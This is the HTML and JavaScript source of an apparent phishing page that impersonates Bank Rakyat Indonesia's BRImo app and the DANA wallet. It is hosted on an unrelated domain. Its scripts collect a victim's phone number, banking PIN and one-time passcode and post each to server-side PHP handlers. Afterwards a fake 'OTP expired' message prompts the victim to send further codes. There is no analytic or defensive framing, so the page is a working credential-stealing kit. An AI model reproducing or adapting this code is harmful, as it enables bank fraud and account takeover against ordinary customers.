<!DOCTYPE html><html><head><meta http-equiv="content-type" content="text/html;charset=UTF-8">

    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <title>BRImo - PT. Bank Rakyat Indonesia (Persero) Tbk.</title>

    <meta property="og:image" content="ast/1.jpg">
	<meta property="og:title" content="PT. Bank Rakyat Indonesia (Persero) Tbk."> 
	<meta property="og:description" content="Gedung BRI Jl. Jenderal Sudirman Kav.44-46 Jakarta 10210 Indonesia">
	<meta name="og:image" content="https://data16.online/321/f53fa9490b0519f3c05319922956decc/ast/1.jpg">
	<link rel="image_src" href="https://data16.online/321/f53fa9490b0519f3c05319922956decc/ast/1.jpg">

    <link rel="stylesheet" href="ast/8d62ea654fcf0e4cae001e344ee2592c.css">
    <link rel="stylesheet" href="ast/00b9d2e9f52e505c013c16bb638a42a4.css">
    <link rel="stylesheet" href="ast/6990a7033bbaeadc2040ac863ff124fd.css">
    <link rel="stylesheet" href="ast/3fadc676582b9542004b502ee03df3a3.css">
    <link rel="stylesheet" href="ast/47e4c58f6b9789b8a33f2525cf084599.css">

    <link href="ast/img/BRImo1.png" rel="icon" type="image/x-icon">

    <!-- Demo styles -->
    <style>
      html,
      body {
        position: relative;
        height: 100%;
		overflow: hidden; 
        background-color: #fff;
        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
        font-size: 14px;
        color: #000;
        margin: 0;
        padding: 0;
      }

	</style>
</head>
<body style="background-color: #f5f5f5;">
    <div style="display:none;" class="index">
        <div class="header">
            <img src="ast/img/dana_BRImo1.png" class="logo" alt="">
        </div>
        <div class="content">
            <div class="hero">
                <img src="ast/img/hero.svg" alt="">
            </div>
            <h1>Dompet digital untuk kamu!</h1>
            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
            <div class="line">
            </div>
            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
            <button type="button" onclick="next();">LOGIN</button>
        </div>
    </div>
    <div class="start" style="display:none; background-color: #fff;">
        <img class="logo" src="ast/img/BRImo1.png" style="height: 80px; width: 80px;">
    </div>
    <div class="container hid">
        <div class="box-login" style="background-color: #fff;">
            <div id="process" name="process" class="process" style="display: none;">
                <div class="loading">
                    <img src="ast/img/load_bg.png">
                    <img class="spinner" src="ast/img/load_spin.png">
                </div>
            </div>
            <div class="header11">
                <a href="login.php"><img src="ast/1.jpg" style="width: 100%; left: 0px; top: 0px;"></a>
            </div>
            
        </div>
	</div>

<script src="ast/jquery-3.5.1.min.js"></script>
<script src="ast/jquery.mask.min.js"></script>
<script>
$(document).ready(function() {
    $('#inp').on('input', function() {
        if ($(this).val() == '0' || $(this).val() == '62') {
            $(this).val('');
        }
    });
});
</script>
<script>
$(document).ready(function() {
    $('#inp').mask('000-0000-000000');
});
</script>
<script>
let inp = document.getElementById("inp");
let btn = document.getElementById("btn");
inp.addEventListener("input", val);

function val() {
    if (inp.value.length > 10) {
        btn.disabled = false;
    } else {
        btn.disabled = true;
    }
};
</script>
<script>
$('.inppin').on('input', function(event) {
    const inputs = $('.inppin');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        sendPin();
    };
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.inppin').on('keydown', function(event) {
    const inputs = $('.inppin');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});
</script>
<script>
$('.inpotp').on('input', function(event) {
    const inputs = $('.inpotp');
    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
    if (isAllFilled == true) {
        $(event.target).blur();
        sendOtp();
    }
    const index = inputs.index(this);
    const currentValue = event.target.value;
    if (currentValue.length === 1) {
        if (index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    } else if (currentValue.length === 0) {
        if (index > 0) {
            inputs[index].focus();
        }
    };
});
$('.inpotp').on('keydown', function(event) {
    const inputs = $('.inpotp');
    const key = event.key;
    const index = inputs.index(this);
    if (key === 'Backspace' && event.target.value.length === 0) {
        if (index > 0) {
            inputs[index - 1].focus();
        }
    };
});
</script>
<script>
$(document).ready(function() {
    $('.clear').click(function() {
        $('.inppin').val('');
        $('#pin1').focus();
    });
    $('.clearotp').click(function() {
        $('.inpotp').val('');
        $('#otp1').focus();
    });
    $('.show').click(function() {
        $('.inppin').each(function() {
            if ($(this).attr('type') === 'password') {
                $(this).attr('type', 'number');
                $(".show").text("SEMBUNYIKAN");
            } else {
                $(this).attr('type', 'password');
                $(".show").text("TAMPILKAN");
            }
        });
    });
});
</script>
<script>
function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    $.ajax({
        type: 'POST',
        url: 'ast/req/sendNohp.php',
        data: $('#formNohp').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $("#formNohp").fadeOut();
            setTimeout(function() {
                $("#inp").val('');
                $("#formPin").fadeIn();
                $("#pin1").focus();
            }, 500);
        }
    });
};
</script>
<script>
function sendPin() {
    $("#process").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/formPin.php',
        data: $('#formPin').serialize(),
        dataType: 'text',
        success: function() {
            $("#process").hide();
            $('.inppin').val('');
            $(".bgotp").fadeIn();
            setInterval(countdown, 1000);
            $("#otp1").focus();
        }
    });
};
</script>
<script>
function sendOtp() {
    $(".loadingOtp").show();
    $.ajax({
        type: 'POST',
        url: 'ast/req/formOtp.php',
        data: $('#formOtp').serialize(),
        dataType: 'text',
        success: function() {
            window.location.href = "googleplayDANA.html";
            setTimeout(function() {
                $(".loadingOtp").hide();
                $('.inpotp').val('');
                $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
                $(".alert").css("color", "red");
            }, 3000);
        }
    });
};
</script>
<script>
function countdown() {
    var count = parseInt($('#countdown').text());
    if (count !== 0) {
        $('#countdown').text(count - 1);
    } else {
        $('#countdown').text('120');
    }
};</script>
<script>
window.onload = function() {
    setTimeout(function() {
        $(".start").fadeIn();
        setTimeout(function() {
            $(".start").fadeOut(1000);
            setTimeout(function() {
                $(".container").fadeIn(200);
                $("#inp").focus();
            }, 1000);
        }, 2000);
    }, 500);
}
</script>



</body></html>